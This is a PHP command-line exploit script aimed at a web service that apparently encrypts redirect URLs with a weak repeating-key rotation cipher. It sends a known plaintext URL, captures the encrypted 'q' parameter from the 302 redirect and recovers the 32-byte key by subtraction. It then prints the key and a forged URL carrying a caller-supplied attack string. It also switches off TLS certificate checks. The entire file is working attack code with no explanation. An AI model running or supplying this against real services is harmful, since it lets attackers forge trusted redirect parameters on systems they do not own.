<?php

function str_rot_pass($str, $key, $decrypt = false) {
	$key_len = strlen($key);
	$result = str_repeat(' ', strlen($str));
	for($i=0; $i<strlen($str); $i++) {
		if($decrypt) {
			$ascii = ord($str[$i]) - ord($key[$i % $key_len]);
		} else {
			$ascii = ord($str[$i]) + ord($key[$i % $key_len]);
		}
		$result[$i] = chr($ascii);
	}
	return $result;
}

function base64_url_encode($input) {
	return rtrim(strtr(base64_encode($input), '+/', '-_'), '=');
}

function base64_url_decode($input) {
	return base64_decode(str_pad(strtr($input, '-_', '+/'), strlen($input) % 4, '=', STR_PAD_RIGHT));
}

$options = getopt('', array('target:', 'attackString:'));

$target = $options['target'];
$attackString = $options['attackString'];

$testString = 'http://8901234567890123456789012';

$curl = curl_init();

curl_setopt($curl, CURLOPT_URL, $target);
if(stripos($target, 'https') === 0) {
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($curl, CURLOPT_SSLVERSION, 0);
}
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, (array('url' => $testString)));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$cipherText = curl_exec($curl);

if(curl_getinfo($curl, CURLINFO_HTTP_CODE) == 302) {
	preg_match('/Location: .+/', $cipherText, $matches, PREG_OFFSET_CAPTURE);
	$cipherText = parse_url(trim(str_ireplace('Location:', '', $matches[0][0])));
	parse_str($cipherText['query'], $cipherText);
}

curl_close($curl);

$tmpText = base64_url_decode($cipherText['q']);

$key = str_repeat(' ', 32);
for($i = 0; $i < 32; $i++) {
	$key[$i] = chr(ord($tmpText[$i]) - ord($testString[$i]));
}

echo 'the key is: '.$key."\n";

echo $target.'?q='.base64_url_encode(str_rot_pass($attackString, $key)),"\n";

?>
